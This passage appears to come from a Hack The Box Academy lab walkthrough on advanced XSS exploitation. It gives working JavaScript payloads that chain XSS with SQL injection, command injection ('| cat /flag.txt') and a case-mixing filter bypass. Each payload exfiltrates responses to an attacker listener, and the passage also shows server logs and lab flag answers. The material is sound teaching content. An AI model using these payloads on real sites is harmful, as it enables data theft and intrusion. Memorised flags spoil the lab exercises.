var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Again, students need to wait a few moments before checking the exfiltration server:

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ python3 server.py

10.129.233.62 - - [05/Jan/2025 10:38:51] code 404, message File not found
10.129.233.62 - - [05/Jan/2025 10:38:51] "GET /exfil?r=PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgVXNlciBEZXRhaWxzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgKDEsIDIsIDMsICYjMzk7Q1JFQVRFIFRBQkxFIGBzZWNyZXRkYXRhYCAoXG4gIGBpZGAgaW50KDExKSBOT1QgTlVMTCxcbiAgYGRhdGFgIGxvbmd0ZXh0IE5PVCBOVUxMXG4pJiMzOTspCiAgICA8L2Rpdj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CgogICAgICAgIDxmb3JtIGFjdGlvbj0iL2NoZWNrIiBtZXRob2Q9InBvc3QiPgoKICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9InVuYW1lIj48Yj5Vc2VybmFtZTwvYj48L2xhYmVsPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIHBsYWNlaG9sZGVyPSJFbnRlciBVc2VybmFtZSIgbmFtZT0idW5hbWUiIHJlcXVpcmVkPgoKICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9InBzdyI+PGI+UGFzc3dvcmQ8L2I+PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgcGxhY2Vob2xkZXI9IkVudGVyIFBhc3N3b3JkIiBuYW1lPSJwYXNzIiByZXF1aXJlZD4KCiAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCI+TG9naW48L2J1dHRvbj4KICAgICAgICAgICAgICAgIDxsYWJlbD4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iY2hlY2tib3giIGNoZWNrZWQ9ImNoZWNrZWQiIG5hbWU9InJlbWVtYmVyIj4gUmVtZW1iZXIgbWUKICAgICAgICAgICAgICAgIDwvbGFiZWw+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZm9ybT4KICAgIDwvZGl2PgoKPC9ib2R5PgoKPC9odG1sPg== HTTP/1.1" 404 -
```

Students need to decode the data:

Code: shell

```shell
echo PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgVXNlciBEZXRhaWxzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgKDEsIDIsIDMsICYjMzk7Q1JFQVRFIFRBQkxFIGBzZWNyZXRkYXRhYCAoXG4gIGBpZGAgaW50KDExKSBOT1QgTlVMTCxcbiAgYGRhdGFgIGxvbmd0ZXh0IE5PVCBOVUxMXG4pJiMzOTspCiAgICA8L2Rpdj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CgogICAgICAgIDxmb3JtIGFjdGlvbj0iL2NoZWNrIiBtZXRob2Q9InBvc3QiPgoKICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9InVuYW1lIj48Yj5Vc2VybmFtZTwvYj48L2xhYmVsPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIHBsYWNlaG9sZGVyPSJFbnRlciBVc2VybmFtZSIgbmFtZT0idW5hbWUiIHJlcXVpcmVkPgoKICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9InBzdyI+PGI+UGFzc3dvcmQ8L2I+PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgcGxhY2Vob2xkZXI9IkVudGVyIFBhc3N3b3JkIiBuYW1lPSJwYXNzIiByZXF1aXJlZD4KCiAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCI+TG9naW48L2J1dHRvbj4KICAgICAgICAgICAgICAgIDxsYWJlbD4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iY2hlY2tib3giIGNoZWNrZWQ9ImNoZWNrZWQiIG5hbWU9InJlbWVtYmVyIj4gUmVtZW1iZXIgbWUKICAgICAgICAgICAgICAgIDwvbGFiZWw+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZm9ybT4KICAgIDwvZGl2PgoKPC9ib2R5PgoKPC9odG1sPg== | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-cmbsngt4pd]─[~]
└──╼ [★]$ echo PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgVXNlciBEZXRhaWxzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgKDEsIDIsIDMsICYjMzk7Q1JFQVRFIFRBQkxFIGBzZWNyZXRkYXRhYCAoXG4gIGBpZGAgaW50KDExKSBOT1QgTlVMTCxcbiAgYGRhdGFgIGxvbmd0ZXh0IE5PVCBOVUxMXG4pJiMzOTspCiAgICA8L2Rpdj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CgogICAgICAgIDxmb3JtIGFjdGlvbj0iL2NoZWNrIiBtZXRob2Q9InBvc3QiPgoKICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9InVuYW1lIj48Yj5Vc2VybmFtZTwvYj48L2xhYmVsPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIHBsYWNlaG9sZGVyPSJFbnRlciBVc2VybmFtZSIgbmFtZT0idW5hbWUiIHJlcXVpcmVkPgoKICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9InBzdyI+PGI+UGFzc3dvcmQ8L2I+PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgcGxhY2Vob2xkZXI9IkVudGVyIFBhc3N3b3JkIiBuYW1lPSJwYXNzIiByZXF1aXJlZD4KCiAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCI+TG9naW48L2J1dHRvbj4KICAgICAgICAgICAgICAgIDxsYWJlbD4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iY2hlY2tib3giIGNoZWNrZWQ9ImNoZWNrZWQiIG5hbWU9InJlbWVtYmVyIj4gUmVtZW1iZXIgbWUKICAgICAgICAgICAgICAgIDwvbGFiZWw+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZm9ybT4KICAgIDwvZGl2PgoKPC9ib2R5PgoKPC9odG1sPg== | base64 -d

<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>

    <h2>Check User Details</h2>

    <div class="modal">
        (1, 2, 3, &#39;CREATE TABLE `secretdata` (\n  `id` int(11) NOT NULL,\n  `data` longtext NOT NULL\n)&#39;)
    </div>
    
<SNIP
```

It is revealed that the `secretdata` table has two columns, `id` and `data`. Therefore, students need to use this information to adjust their payload, dumping the contents of the table by including the column names in the `UNION SELECT` query:

Code: js

```js
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' UNION SELECT id,data,1,2 FROM secretdata-- -")}&pass=x`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Saving the payload to the exploit server, students need to wait a few moments before checking the exfiltration server:

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ python3 server.py

10.129.233.62 - - [05/Jan/2025 10:38:51] code 404, message File not found
10.129.233.62 - - [05/Jan/2025 10:38:51] "GET /exfil?r=PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgVXNlciBEZXRhaWxzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgKDEsIDIsIDEsICYjMzk7SFRCezVhNjBmYTUwMWUxODY2NjI2ZTk2MTE1YjU5OGQ0NTQxfSYjMzk7KQogICAgPC9kaXY+CgogICAgPGRpdiBjbGFzcz0ibW9kYWwiPgoKICAgICAgICA8Zm9ybSBhY3Rpb249Ii9jaGVjayIgbWV0aG9kPSJwb3N0Ij4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJ1bmFtZSI+PGI+VXNlcm5hbWU8L2I+PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBwbGFjZWhvbGRlcj0iRW50ZXIgVXNlcm5hbWUiIG5hbWU9InVuYW1lIiByZXF1aXJlZD4KCiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJwc3ciPjxiPlBhc3N3b3JkPC9iPjwvbGFiZWw+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJFbnRlciBQYXNzd29yZCIgbmFtZT0icGFzcyIgcmVxdWlyZWQ+CgogICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiPkxvZ2luPC9idXR0b24+CiAgICAgICAgICAgICAgICA8bGFiZWw+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjaGVja2VkPSJjaGVja2VkIiBuYW1lPSJyZW1lbWJlciI+IFJlbWVtYmVyIG1lCiAgICAgICAgICAgICAgICA8L2xhYmVsPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCjwvYm9keT4KCjwvaHRtbD4=HTTP/1.1" 404 -
```

Finally, students need to decode the data to find the flag:

Code: shell

```shell
echo PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgVXNlciBEZXRhaWxzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgKDEsIDIsIDEsICYjMzk7SFRCezVhNjBmYTUwMWUxODY2NjI2ZTk2MTE1YjU5OGQ0NTQxfSYjMzk7KQogICAgPC9kaXY+CgogICAgPGRpdiBjbGFzcz0ibW9kYWwiPgoKICAgICAgICA8Zm9ybSBhY3Rpb249Ii9jaGVjayIgbWV0aG9kPSJwb3N0Ij4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJ1bmFtZSI+PGI+VXNlcm5hbWU8L2I+PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBwbGFjZWhvbGRlcj0iRW50ZXIgVXNlcm5hbWUiIG5hbWU9InVuYW1lIiByZXF1aXJlZD4KCiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJwc3ciPjxiPlBhc3N3b3JkPC9iPjwvbGFiZWw+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJFbnRlciBQYXNzd29yZCIgbmFtZT0icGFzcyIgcmVxdWlyZWQ+CgogICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiPkxvZ2luPC9idXR0b24+CiAgICAgICAgICAgICAgICA8bGFiZWw+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjaGVja2VkPSJjaGVja2VkIiBuYW1lPSJyZW1lbWJlciI+IFJlbWVtYmVyIG1lCiAgICAgICAgICAgICAgICA8L2xhYmVsPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCjwvYm9keT4KCjwvaHRtbD4= | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.15.142]─[htb-ac-594497@htb-otigqjh20t]─[~]
└──╼ [★]$ echo PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgVXNlciBEZXRhaWxzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgKDEsIDIsIDEsICYjMzk7SFRCezVhNjBmYTUwMWUxODY2NjI2ZTk2MTE1YjU5OGQ0NTQxfSYjMzk7KQogICAgPC9kaXY+CgogICAgPGRpdiBjbGFzcz0ibW9kYWwiPgoKICAgICAgICA8Zm9ybSBhY3Rpb249Ii9jaGVjayIgbWV0aG9kPSJwb3N0Ij4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJ1bmFtZSI+PGI+VXNlcm5hbWU8L2I+PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBwbGFjZWhvbGRlcj0iRW50ZXIgVXNlcm5hbWUiIG5hbWU9InVuYW1lIiByZXF1aXJlZD4KCiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJwc3ciPjxiPlBhc3N3b3JkPC9iPjwvbGFiZWw+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJFbnRlciBQYXNzd29yZCIgbmFtZT0icGFzcyIgcmVxdWlyZWQ+CgogICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiPkxvZ2luPC9idXR0b24+CiAgICAgICAgICAgICAgICA8bGFiZWw+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjaGVja2VkPSJjaGVja2VkIiBuYW1lPSJyZW1lbWJlciI+IFJlbWVtYmVyIG1lCiAgICAgICAgICAgICAgICA8L2xhYmVsPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCjwvYm9keT4KCjwvaHRtbD4= | base64 -d

<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>

    <h2>Check User Details</h2>

    <div class="modal">
        (1, 2, 1, &#39;HTB{5a60fa501e1866626e96115b598d4541}&#39;)
    </div>
```

Answer: `HTB{5a60fa501e1866626e96115b598d4541}`

## Exploiting internal Web Applications II

### Question 1

#### "Exploit the XSS vulnerability to target the internal web application and obtain the flag."

Students need to first add the necessary vhosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb internal-webapps-2.htb" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.233.62 exploitserver.htb internal-webapps-2.htb" >> /etc/hosts'
```

Next, students need to log in to the vulnerable site using the credentials `htb-stdnt:Academy_student!`. Subsequently, students need to submit their base XSS payload as a guestbook entry:

Code: html

Code: html

```html
<script src="https://exploitserver.htb/exploit"></script>
```

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_39.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_39.png)

Once submitted, students need to prepare a payload on the exploit server, attempting to exploit the command injection vulnerability on the internal site that was identified in the section's reading. Students need to have the payload execute the command `cat /flag.txt` , and have the output sent to the exfiltration server:

Code: js

```js
var xhr = new XMLHttpRequest();
var params = `webapp_selector=${encodeURIComponent("| cat /flag.txt")}`;
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_47.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_47.png)

After saving the payload to the exploit server, students need to wait a few moments before checking the exfiltration server:

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ python3 server.py

10.129.233.62 - - [05/Jan/2025 10:50:09] code 404, message File not found
10.129.233.62 - - [05/Jan/2025 10:50:09] "GET /exfil?r=PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgU3RhdHVzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgSFRCezBlYzlhZTNhZWEzYzU5MTIxZmYyZjFiNGU5OWQwZmNhfQoKICAgIDwvZGl2PgoKICAgIDxkaXYgY2xhc3M9Im1vZGFsIj4KCiAgICAgICAgPGZvcm0gYWN0aW9uPSIvY2hlY2siIG1ldGhvZD0icG9zdCI+CgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPGI+U2VsZWN0IHRoZSBXZWIgQXBwbGljYXRpb248L2I+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icmFkaW8iIGlkPSJtYWluIiBuYW1lPSJ3ZWJhcHBfc2VsZWN0b3IiIHZhbHVlPSJodHRwczovL2ludGVybmFsLXdlYmFwcHMtMi5odGIiPgogICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0ibWFpbiI+aW50ZXJuYWwtd2ViYXBwcy0yLmh0YjwvbGFiZWw+PGJyPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBpZD0iaW50ZXJuYWwiIG5hbWU9IndlYmFwcF9zZWxlY3RvciIgdmFsdWU9Imh0dHBzOi8vaW50ZXJuYWwuaW50ZXJuYWwtd2ViYXBwcy0yLmh0YiI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJpbnRlcm5hbCI+aW50ZXJuYWwuaW50ZXJuYWwtd2ViYXBwcy0yLmh0YjwvbGFiZWw+PGJyPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBpZD0iYXBpIiBuYW1lPSJ3ZWJhcHBfc2VsZWN0b3IiIHZhbHVlPSJodHRwczovL2FwaS5pbnRlcm5hbC13ZWJhcHBzLTIuaHRiIj4KICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImFwaSI+YXBpLmludGVybmFsLXdlYmFwcHMtMi5odGI8L2xhYmVsPgoKICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0Ij5DaGVjazwvYnV0dG9uPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCjwvYm9keT4KCjwvaHRtbD4= HTTP/1.1" 404 -
```

Students need to decode the base64 encoded response, revealing the flag:

Code: shell

```shell
echo PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgU3RhdHVzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgSFRCezBlYzlhZTNhZWEzYzU5MTIxZmYyZjFiNGU5OWQwZmNhfQoKICAgIDwvZGl2PgoKICAgIDxkaXYgY2xhc3M9Im1vZGFsIj4KCiAgICAgICAgPGZvcm0gYWN0aW9uPSIvY2hlY2siIG1ldGhvZD0icG9zdCI+CgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPGI+U2VsZWN0IHRoZSBXZWIgQXBwbGljYXRpb248L2I+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icmFkaW8iIGlkPSJtYWluIiBuYW1lPSJ3ZWJhcHBfc2VsZWN0b3IiIHZhbHVlPSJodHRwOi8vdnVsbmVyYWJsZXNpdGUuaHRiIj4KICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9Im1haW4iPnZ1bG5lcmFibGVzaXRlLmh0YjwvbGFiZWw+PGJyPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBpZD0iaW50ZXJuYWwiIG5hbWU9IndlYmFwcF9zZWxlY3RvciIgdmFsdWU9Imh0dHA6Ly9pbnRlcm5hbC52dWxuZXJhYmxlc2l0ZS5odGIiPgogICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0iaW50ZXJuYWwiPmludGVybmFsLnZ1bG5lcmFibGVzaXRlLmh0YjwvbGFiZWw+PGJyPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBpZD0iYXBpIiBuYW1lPSJ3ZWJhcHBfc2VsZWN0b3IiIHZhbHVlPSJodHRwOi8vYXBpLnZ1bG5lcmFibGVzaXRlLmh0YiI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJhcGkiPmFwaS52dWxuZXJhYmxlc2l0ZS5odGI8L2xhYmVsPgoKICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0Ij5DaGVjazwvYnV0dG9uPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCjwvYm9keT4KCjwvaHRtbD4= | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.15.142]─[htb-ac-594497@htb-e4dvsyfpkx]─[~]
└──╼ [★]$ echo PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgU3RhdHVzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgSFRCezBlYzlhZTNhZWEzYzU5MTIxZmYyZjFiNGU5OWQwZmNhfQoKICAgIDwvZGl2PgoKICAgIDxkaXYgY2xhc3M9Im1vZGFsIj4KCiAgICAgICAgPGZvcm0gYWN0aW9uPSIvY2hlY2siIG1ldGhvZD0icG9zdCI+CgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPGI+U2VsZWN0IHRoZSBXZWIgQXBwbGljYXRpb248L2I+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icmFkaW8iIGlkPSJtYWluIiBuYW1lPSJ3ZWJhcHBfc2VsZWN0b3IiIHZhbHVlPSJodHRwOi8vdnVsbmVyYWJsZXNpdGUuaHRiIj4KICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9Im1haW4iPnZ1bG5lcmFibGVzaXRlLmh0YjwvbGFiZWw+PGJyPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBpZD0iaW50ZXJuYWwiIG5hbWU9IndlYmFwcF9zZWxlY3RvciIgdmFsdWU9Imh0dHA6Ly9pbnRlcm5hbC52dWxuZXJhYmxlc2l0ZS5odGIiPgogICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0iaW50ZXJuYWwiPmludGVybmFsLnZ1bG5lcmFibGVzaXRlLmh0YjwvbGFiZWw+PGJyPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBpZD0iYXBpIiBuYW1lPSJ3ZWJhcHBfc2VsZWN0b3IiIHZhbHVlPSJodHRwOi8vYXBpLnZ1bG5lcmFibGVzaXRlLmh0YiI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJhcGkiPmFwaS52dWxuZXJhYmxlc2l0ZS5odGI8L2xhYmVsPgoKICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0Ij5DaGVjazwvYnV0dG9uPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCjwvYm9keT4KCjwvaHRtbD4= | base64 -d

<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>

    <h2>Check Status</h2>

    <div class="modal">
        HTB{0ec9ae3aea3c59121ff2f1b4e99d0fca}

    </div>
    
<SNIP>
```

Answer: `HTB{0ec9ae3aea3c59121ff2f1b4e99d0fca}`

## XSS Filter Bypasses

### Question 1

#### "Bypass the XSS filter to exploit the XSS vulnerability to exfiltrate data the victim can access and find the flag."

Students need to first add the necessary vhosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb filterbypass.htb" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.233.62 exploitserver.htb filterbypass.htb" >> /etc/hosts'
```

Next, students need to log in to the vulnerable site using the credentials `htb-stdnt:Academy_student!`. Subsequently, students need to submit their base XSS payload as a guestbook entry. However, this version of the vulnerable site employs XSS filters. Therefore, to bypass the filter, students need to use a mix of lowercase and uppercase letters:

Code: html

```html
<ScRiPt SrC="https://exploitserver.htb/exploit"></ScRiPt>
```

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_49.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_49.png)

After submitting the base XSS payload to the guestbook, students need to navigate to the exploit server. Then, students need to craft a payload to exfiltrate the contents of the `admin.php` endpoint:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://filterbypass.htb/admin.php', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_50.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_50.png)

After saving the payload to the exploit server, students need to wait a few moments before checking the exfiltration server:

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ python3 server.py

10.129.233.62 - - [05/Jan/2025 10:54:32] code 404, message File not found
